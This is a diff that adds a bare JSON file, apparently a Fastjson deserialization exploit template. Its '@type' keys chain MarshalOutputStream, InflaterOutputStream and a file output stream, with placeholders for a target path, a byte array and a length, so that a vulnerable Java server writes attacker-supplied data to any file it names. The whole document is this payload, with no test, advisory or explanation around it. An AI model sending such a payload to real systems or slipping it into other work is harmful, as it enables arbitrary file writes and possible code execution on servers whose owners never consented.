@@ -1,0 +1,20 @@
+{
+  "@type": "java.io.OutputStream",
+  "@type": "sun.rmi.server.MarshalOutputStream",
+  "out": {
+    "@type": "java.util.zip.InflaterOutputStream",
+    "out": {
+      "@type": "com.app.FilterFileOutputStream",
+      "name": "${path}",
+      "prefix": "/"
+    },
+    "infl": {
+      "input": {
+        "array": "${array}",
+        "limit": ${limit}
+      }
+    },
+    "bufLen": "100"
+  },
+  "protocolVersion": 1
+}
